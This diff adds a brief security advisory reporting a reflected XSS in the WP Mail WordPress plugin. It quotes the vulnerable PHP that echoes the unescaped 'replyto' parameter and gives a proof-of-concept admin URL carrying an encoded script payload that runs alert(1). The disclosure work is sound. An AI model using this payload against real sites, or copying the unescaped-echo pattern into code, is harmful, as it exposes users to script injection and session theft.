@@ -1,0 +1,26 @@
+Reflected XSS in wp-mail plugin 
+-------------------------------
+
+*About*
+
+> WP Mail plugin is simply a wp network mail or message system. User can send mail or messages to other users over one wp network. 
+
+*Author*: [mndpsingh287](https://profiles.wordpress.org/mndpsingh287)
+
+*Timeline*
+
+* 2016-07-23: Vendor Notified
+
+*Vulnerability*: The `replyto` parameter when composing a mail allows for a reflected XSS. 
+
+	$replyTo = isset($_GET['replyto']) ? $_GET['replyto'] : '';
+	...
+	<input type="text" class="form-control" placeholder="Enter receiver's wordpress email" name="reciever_mail" required="required" value="<?php echo !empty($replyTo) ? $replyTo : $to; ?>">
+ 
+*Proof of Concept*: Altering the url would allow for the XSS to be executed
+
+`http://wordpress.site/wp-admin/admin.php?page=wp_mail_compose&replyto=%22%3E%3Cscript+src%3Ddata%3A%26comma%3Balert%281%29%2F%2F`
+
+would execute `alert(1)` but could be used to run something more malicious
+
+*Further Reading*: More information on XSS [here](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_\(XSS\))
